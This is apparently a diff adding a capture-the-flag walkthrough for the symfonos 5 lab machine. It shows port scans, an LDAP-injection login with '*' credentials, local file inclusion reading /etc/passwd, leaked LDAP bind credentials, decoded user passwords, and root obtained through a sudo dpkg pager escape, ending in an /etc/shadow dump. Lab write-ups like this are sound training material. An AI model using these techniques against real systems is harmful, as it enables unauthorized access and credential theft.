@@ -156,6 +156,134 @@ I know that 94 is symfonos 5.2, but still no indication from the box itself.
 
 This is an interesting problem, I guess I gotta hack them all.
 
+```shell
+_nu $RHOST
+firing sudo nmap 192.168.56.94 -sU -p- -Pn --min-rate=5000 --open --top-ports=500 -n | tee nmap.udp-all-ports.txt
+[sudo] password for f0c1s:
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 17:49 IST
+Nmap scan report for 192.168.56.94
+Host is up (0.00076s latency).
+All 500 scanned ports on 192.168.56.94 are in ignored states.
+Not shown: 494 open|filtered udp ports (no-response), 6 closed udp ports (port-unreach)
+MAC Address: 08:00:27:40:FB:1A (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds
+
+```
+
+```shell
+_n $RHOST
+firing nmap 192.168.56.94 -n | tee nmap.default.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 17:49 IST
+Nmap scan report for 192.168.56.94
+Host is up (0.00032s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+389/tcp open  ldap
+636/tcp open  ldapssl
+
+Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
+
+```
+
+```shell
+_ntd $RHOST
+firing nmap 192.168.56.94 -p- -Pn -A -T4 --min-rate=5000 -sVC -n | tee nmap.tcp-ports.deep.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 17:49 IST
+Nmap scan report for 192.168.56.94
+Host is up (0.00014s latency).
+Not shown: 65531 closed tcp ports (conn-refused)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey:
+|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)
+|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)
+|_  256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)
+80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
+636/tcp open  ldapssl?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.73 seconds
+
+```
+
+```shell
+sudo nmap $RHOST -p- -Pn -A -T4 --min-rate=5000 -sVC --script=*enum* -n | tee nmap.enum.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-08 17:50 IST
+Nmap scan report for 192.168.56.94
+Host is up (0.0011s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh2-enum-algos:
+|   kex_algorithms: (10)
+|       curve25519-sha256
+|       curve25519-sha256@libssh.org
+|       ecdh-sha2-nistp256
+|       ecdh-sha2-nistp384
+|       ecdh-sha2-nistp521
+|       diffie-hellman-group-exchange-sha256
+|       diffie-hellman-group16-sha512
+|       diffie-hellman-group18-sha512
+|       diffie-hellman-group14-sha256
+|       diffie-hellman-group14-sha1
+|   server_host_key_algorithms: (5)
+|       rsa-sha2-512
+|       rsa-sha2-256
+|       ssh-rsa
+|       ecdsa-sha2-nistp256
+|       ssh-ed25519
+|   encryption_algorithms: (6)
+|       chacha20-poly1305@openssh.com
+|       aes128-ctr
+|       aes192-ctr
+|       aes256-ctr
+|       aes128-gcm@openssh.com
+|       aes256-gcm@openssh.com
+|   mac_algorithms: (10)
+|       umac-64-etm@openssh.com
+|       umac-128-etm@openssh.com
+|       hmac-sha2-256-etm@openssh.com
+|       hmac-sha2-512-etm@openssh.com
+|       hmac-sha1-etm@openssh.com
+|       umac-64@openssh.com
+|       umac-128@openssh.com
+|       hmac-sha2-256
+|       hmac-sha2-512
+|       hmac-sha1
+|   compression_algorithms: (2)
+|       none
+|_      zlib@openssh.com
+80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-enum:
+|_  /admin.php: Possible admin folder
+389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
+636/tcp open  ldapssl?
+MAC Address: 08:00:27:40:FB:1A (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.09 ms 192.168.56.94
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.43 seconds
+
+```
+
+
 ## Attacking web
 
 ```shell
@@ -355,7 +483,511 @@ Megapixels                      : 2.1
 
 ```
 
+## Fuzz
 
+I tried multiple things, this worked.
+
+```shell
+ffuf -u "http://$RHOST/admin.php?username=FUZZ&password=FUZZ" -w /usr/share/wordlists/dirb/stress/alphanum_case_extra.txt -fc 403,404,401,400 -s -fs 1663
+#
+*
+
+
+```
+
+Credentials: `*:*`
+
+Yes, that is `username=*` and `password=*`.
+
+## home.php
+
+![5.home-php](5.home-php.png)
+
+![6.LFI](6.LFI.png)
+
+Notice `home.php?url=http://127.0.0.1/portraits.php`
+
+![7.etc-passwd-via-LFI](7.etc-passwd-via-LFI.png)
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+```
+
+Wait, no user other than root? Interesting and a first.
+
+/etc/hosts
+
+```
+127.0.0.1	localhost
+::1	localhost ip6-localhost ip6-loopback
+fe00::0	ip6-localnet
+ff00::0	ip6-mcastprefix
+ff02::1	ip6-allnodes
+ff02::2	ip6-allrouters
+172.18.0.23	f060c2ead228
+```
+
+### /home.php
+
+```php
+<?php
+session_start();
+
+if(!isset($_SESSION['loggedin'])){
+	header("Location: admin.php");
+	exit;
+}
+
+if (!empty($_GET["url"]))
+{
+$r = $_GET["url"];
+$result = file_get_contents($r);
+}
+
+?>
+<html>
+<head>
+<link rel="stylesheet" type="text/css" href="/static/bootstrap.min.css">
+</head>
+<body>
+<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+  <a class="navbar-brand" href="home.php">symfonos</a>
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarColor02" aria-controls="navbarColor02" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarColor02">
+    <ul class="navbar-nav mr-auto">
+      <li class="nav-item">
+        <a class="nav-link" href="home.php">Home</a>
+      </li>
+      <li class="nav-item">
+        <a class="nav-link" href="home.php?url=http://127.0.0.1/portraits.php">Portraits</a>
+      </li>
+      <li class="nav-item">
+        <a class="nav-link" href="logout.php">Logout</a>
+      </li>
+    </ul>
+  </div>
+</nav><br />
+<center>
+<?php
+if ($result){
+echo $result;
+} else {
+echo "<h3>Under Developement</h3>";
+} ?>
+</center>
+</body>
+
+```
+
+### /admin.php
+
+```php
+<?php
+session_start();
+
+if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
+    header("location: home.php");
+    exit;
+}
+
+function authLdap($username, $password) {
+  $ldap_ch = ldap_connect("ldap://172.18.0.22");
+
+  ldap_set_option($ldap_ch, LDAP_OPT_PROTOCOL_VERSION, 3);
+
+  if (!$ldap_ch) {
+    return FALSE;
+  }
+
+  $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");
+
+  if (!$bind) {
+    return FALSE;
+  }
+
+  $filter = "(&(uid=$username)(userPassword=$password))";
+  $result = ldap_search($ldap_ch, "dc=symfonos,dc=local", $filter);
+
+  if (!$result) {
+    return FALSE;
+  }
+
+  $info = ldap_get_entries($ldap_ch, $result);
+
+  if (!($info) || ($info["count"] == 0)) {
+    return FALSE;
+  }
+
+  return TRUE;
+
+}
+
+if(isset($_GET['username']) && isset($_GET['password'])){
+
+$username = urldecode($_GET['username']);
+$password = urldecode($_GET['password']);
+
+$bIsAuth = authLdap($username, $password);
+
+if (! $bIsAuth ) {
+	$msg = "Invalid login";
+} else {
+        $_SESSION["loggedin"] = true;
+	header("location: home.php");
+	exit;
+}
+}
+?>
+<html>
+<head>
+<link rel="stylesheet" type="text/css" href="/static/bootstrap.min.css">
+</head>
+<body><br />
+<div class="container">
+        <div class="row justify-content-center">
+            <div class="col-md-8">
+                <div class="card">
+                    <div class="card-header">Login</div>
+                    <div class="card-body">
+                        <form action="admin.php" method="GET">
+                            <div class="form-group row">
+                                <label for="email_address" class="col-md-4 col-form-label text-md-right">Username</label>
+                                <div class="col-md-6">
+                                    <input type="text" id="username" class="form-control" name="username" required autofocus>
+                                </div>
+                            </div>
+
+                            <div class="form-group row">
+                                <label for="password" class="col-md-4 col-form-label text-md-right">Password</label>
+                                <div class="col-md-6">
+                                    <input type="password" id="password" class="form-control" name="password" required>
+                                </div>
+                            </div>
+
+                            <div class="col-md-6 offset-md-4">
+                                <button type="submit" class="btn btn-primary">
+                                    Login
+                                </button>
+			   </div>
+                    </div>
+                    </form>
+                </div>
+<center><strong><?php echo $msg; ?></strong></center>
+</div>
+</body>
+</html>
+
+```
+
+Interesting things of note:
+
+- ` $ldap_ch = ldap_connect("ldap://172.18.0.22");`
+- ` $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");`
+
+[Take a look at doc](https://www.php.net/manual/en/function.ldap-bind.php)
+
+![8.ldap-bind](8.ldap-bind.png)
+
+## LDAP
+
+
+```shell
+ldapsearch -h $RHOST -p 389 -D "cn=admin,dc=symfonos,dc=local" -w qMDdyZh3cT6eeAWD -b "dc=symfonos,dc=local"
+# extended LDIF
+#
+# LDAPv3
+# base <dc=symfonos,dc=local> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# symfonos.local
+dn: dc=symfonos,dc=local
+objectClass: top
+objectClass: dcObject
+objectClass: organization
+o: symfonos
+dc: symfonos
+
+# admin, symfonos.local
+dn: cn=admin,dc=symfonos,dc=local
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+cn: admin
+description: LDAP administrator
+userPassword:: e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=
+
+# zeus, symfonos.local
+dn: uid=zeus,dc=symfonos,dc=local
+uid: zeus
+cn: zeus
+sn: 3
+objectClass: top
+objectClass: posixAccount
+objectClass: inetOrgPerson
+loginShell: /bin/bash
+homeDirectory: /home/zeus
+uidNumber: 14583102
+gidNumber: 14564100
+userPassword:: Y2V0a0tmNHdDdUhDOUZFVA==
+mail: zeus@symfonos.local
+gecos: Zeus User
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 4
+# numEntries: 3
+
+```
+
+## SSH
+
+```shell
+## admin password
+echo -n "e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=" | base64 -d
+{SSHA}UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm
+
+## zeus password
+echo -n "Y2V0a0tmNHdDdUhDOUZFVA==" | base64 -d
+cetkKf4wCuHC9FET
+```
+
+```shell
+ssh zeus@$RHOST
+zeus@192.168.56.94's password:
+Linux symfonos5 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Feb  5 06:14:43 2020 from 172.16.1.1
+zeus@symfonos5:~$ id
+uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+zeus@symfonos5:~$ whoami
+zeus
+zeus@symfonos5:~$ hostname
+symfonos5
+zeus@symfonos5:~$ date
+Sat 08 Jan 2022 12:00:50 PM CST
+
+
+```
+
+### /etc/passwd
+
+```shell
+zeus@symfonos5:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+zeus:x:1000:1000:,,,:/home/zeus:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+zeus@symfonos5:~$
+```
+
+![9.ssh-as-zeus](9.ssh-as-zeus.png)
+
+## Abuse nopasswd dpkg
+
+![10.search](10.search.png)
+
+[https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/](https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/)
+
+Well, too much to read, little payoff for now.
+
+Lets go gtfobins!
+
+## Root shell
+
+```shell
+zeus@symfonos5:~$ sudo -l
+Matching Defaults entries for zeus on symfonos5:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User zeus may run the following commands on symfonos5:
+    (root) NOPASSWD: /usr/bin/dpkg
+
+zeus@symfonos5:~$ sudo dpkg -l
+Desired=Unknown/Install/Remove/Purge/Hold
+| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
+|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
+||/ Name                          Version                     Architecture Description
++++-=============================-===========================-============-========================================
+ii  adduser                       3.118                       all          add and remove users and groups
+ii  ame                           1.0                         amd64        no description given
+ii  apparmor                      2.13.2-10                   amd64        user-space parser utility for AppArmor
+ii  apt                           1.8.2                       amd64        commandline package manager
+ii  apt-listchanges               3.19                        all          package change history notification tool
+ii  apt-transport-https           1.8.2                       all          transitional package for https support
+ii  apt-utils                     1.8.2                       amd64        package management related utility progr
+ii  aufs-dkms                     4.19+20190211-1             all          DKMS files to build and install aufs
+ii  aufs-tools                    1:4.14+20190211-1           amd64        Tools to manage aufs filesystems
+ii  base-files                    10.3+deb10u2                amd64        Debian base system miscellaneous files
+ii  base-passwd                   3.5.46                      amd64        Debian base system master password and g
+ii  bash                          5.0-4                       amd64        GNU Bourne Again SHell
+ii  bash-completion               1:2.8-6                     all          programmable completion for the bash she
+ii  bind9-host                    1:9.11.5.P4+dfsg-5.1        amd64        DNS lookup utility (deprecated)
+ii  binutils                      2.31.1-16                   amd64        GNU assembler, linker and binary utiliti
+ii  binutils-common:amd64         2.31.1-16                   amd64        Common files for the GNU assembler, link
+ii  binutils-x86-64-linux-gnu     2.31.1-16                   amd64        GNU binary utilities, for x86-64-linux-g
+ii  bsdmainutils                  11.1.2+b1                   amd64        collection of more utilities from FreeBS
+ii  bsdutils                      1:2.33.1-0.1                amd64        basic utilities from 4.4BSD-Lite
+ii  build-essential               12.6                        amd64        Informational list of build-essential pa
+ii  busybox                       1:1.30.1-4                  amd64        Tiny utilities for small and embedded sy
+ii  bzip2                         1.0.6-9.2~deb10u1           amd64        high-quality block-sorting file compress
+ii  ca-certificates               20190110                    all          Common CA certificates
+ii  cgroupfs-mount                1.4                         all          Light-weight package to set up cgroupfs
+ii  console-setup                 1.193~deb10u1               all          console font and keymap setup program
+ii  console-setup-linux           1.193~deb10u1               all          Linux specific part of console-setup
+ii  containerd.io                 1.2.10-3                    amd64        An open and reliable container runtime
+ii  coreutils                     8.30-3                      amd64        GNU core utilities
+ii  cpio                          2.12+dfsg-9                 amd64        GNU cpio -- a program to manage archives
+ii  cpp                           4:8.3.0-1                   amd64        GNU C preprocessor (cpp)
+ii  cpp-8                         8.3.0-6                     amd64        GNU C preprocessor
+ii  cron                          3.0pl1-134+deb10u1          amd64        process scheduling daemon
+ii  curl                          7.64.0-4                    amd64        command line tool for transferring data
+ii  dash                          0.5.10.2-5                  amd64        POSIX-compliant shell
+ii  dbus                          1.12.16-1                   amd64        simple interprocess messaging system (da
+ii  debconf                       1.5.71                      all          Debian configuration management system
+ii  debconf-i18n                  1.5.71                      all          full internationalization support for de
+ii  debian-archive-keyring        2019.1                      all          GnuPG archive keys of the Debian archive
+ii  debian-faq                    9.0                         all          Debian Frequently Asked Questions
+ii  debianutils                   4.8.6.1                     amd64        Miscellaneous utilities specific to Debi
+ii  dictionaries-common           1.28.1                      all          spelling dictionaries - common utilities
+ii  diffutils                     1:3.7-3                     amd64        File comparison utilities
+ii  dirmngr                       2.2.12-1+deb10u1            amd64        GNU privacy guard - network certificate
+ii  discover                      2.1.2-8                     amd64        hardware identification system
+ii  discover-data                 2.2013.01.11                all          Data lists for Discover hardware detecti
+ii  distro-info-data              0.41+deb10u1                all          information about the distributions' rel
+ii  dkms                          2.6.1-4                     all          Dynamic Kernel Module Support Framework
+ii  dmidecode                     3.2-1                       amd64        SMBIOS/DMI table decoder
+ii  dmsetup                       2:1.02.155-3                amd64        Linux Kernel Device Mapper userspace lib
+ii  doc-debian                    6.4                         all          Debian Project documentation and other d
+ii  docker-ce                     5:19.03.5~3-0~debian-buster amd64        Docker: the open-source application cont
+ii  docker-ce-cli                 5:19.03.5~3-0~debian-buster amd64        Docker CLI: the open-source application
+!/bin/bash
+root@symfonos5:/home/zeus# id
+uid=0(root) gid=0(root) groups=0(root)
+root@symfonos5:/home/zeus# whoami
+root
+root@symfonos5:/home/zeus# date
+Sat 08 Jan 2022 12:13:16 PM CST
+root@symfonos5:/home/zeus# hostname
+symfonos5
+root@symfonos5:/home/zeus# cat /etc/shadow
+root:$6$LCi0CrNofw.bZNIH$1JzaRFhkZM5zjdzhkcHyRoNluDS2w40H99UpCJCAhjhIyltCRND/7yMqMIyZ77RZwK1VDqk9mwTuZ88eqxSEw.:18297:0:99999:7:::
+daemon:*:18264:0:99999:7:::
+bin:*:18264:0:99999:7:::
+sys:*:18264:0:99999:7:::
+sync:*:18264:0:99999:7:::
+games:*:18264:0:99999:7:::
+man:*:18264:0:99999:7:::
+lp:*:18264:0:99999:7:::
+mail:*:18264:0:99999:7:::
+news:*:18264:0:99999:7:::
+uucp:*:18264:0:99999:7:::
+proxy:*:18264:0:99999:7:::
+www-data:*:18264:0:99999:7:::
+backup:*:18264:0:99999:7:::
+list:*:18264:0:99999:7:::
+irc:*:18264:0:99999:7:::
+gnats:*:18264:0:99999:7:::
+nobody:*:18264:0:99999:7:::
+_apt:*:18264:0:99999:7:::
+systemd-timesync:*:18264:0:99999:7:::
+systemd-network:*:18264:0:99999:7:::
+systemd-resolve:*:18264:0:99999:7:::
+messagebus:*:18264:0:99999:7:::
+sshd:*:18264:0:99999:7:::
+zeus:$6$Q/Ttwr2DXtZboixL$AXcyIXQZ.O1ZQ0iOPhqKdel6Wb5GG3937Il6Dc0aG/yvdtvhp9Ovv0A5lVUXZ5rwUgR5yvXJuLMl1rM7Dx8ke.:18267:0:99999:7:::
+systemd-coredump:!!:18264::::::
+root@symfonos5:/home/zeus# cd /root
+root@symfonos5:~# ls
+proof.txt
+root@symfonos5:~# cat proof.txt
+
+                    Congrats on rooting symfonos:5!
+
+                                   ZEUS
+              *      .            dZZZZZ,       .          *
+                                 dZZZZ  ZZ,
+     *         .         ,AZZZZZZZZZZZ  `ZZ,_          *
+                    ,ZZZZZZV'      ZZZZ   `Z,`\
+                  ,ZZZ    ZZ   .    ZZZZ   `V
+        *      ZZZZV'     ZZ         ZZZZ    \_              .
+.              V   l   .   ZZ        ZZZZZZ          .
+               l    \       ZZ,     ZZZ  ZZZZZZ,
+   .          /            ZZ l    ZZZ    ZZZ `Z,
+                          ZZ  l   ZZZ     Z Z, `Z,            *
+                .        ZZ      ZZZ      Z  Z, `l
+                         Z        ZZ      V  `Z   \
+                         V        ZZC     l   V
+           Z             l        V ZR        l      .
+            \             \       l  ZA
+                            \         C          C
+                                  \   K   /    /             K
+                          A    \   \  |  /  /              /
+                           \        \\|/ /  /
+   __________________________________\|/_________________________
+            Contact me via Twitter @zayotic to give feedback!
+
+root@symfonos5:~#
+```
+
+![11.sudo-l](11.sudo-l.png)
+
+![12.rooted](12.rooted.png)
+
+Rooted.
+
+Basically `sudo dpkg -i` followed by `!/bin/bash`, drops you into the root shell.
 
 </body>
 </html>
